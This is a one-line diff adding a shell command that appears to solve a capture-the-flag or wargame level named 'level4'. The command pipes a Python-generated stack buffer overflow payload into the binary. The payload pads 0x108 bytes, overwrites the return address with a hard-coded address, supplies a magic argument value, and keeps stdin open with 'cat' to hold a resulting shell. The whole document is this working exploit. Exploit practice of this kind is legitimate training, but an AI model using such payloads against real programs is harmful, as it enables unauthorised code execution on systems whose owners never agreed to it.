@@ -1,0 +1,1 @@
+(python -c 'print "A" * 0x108 + "B" * 4 + "\x6b\x84\x04\x08" + "CCCC" + "\xfe\xc4\xde\xc0"';cat) | ./level4
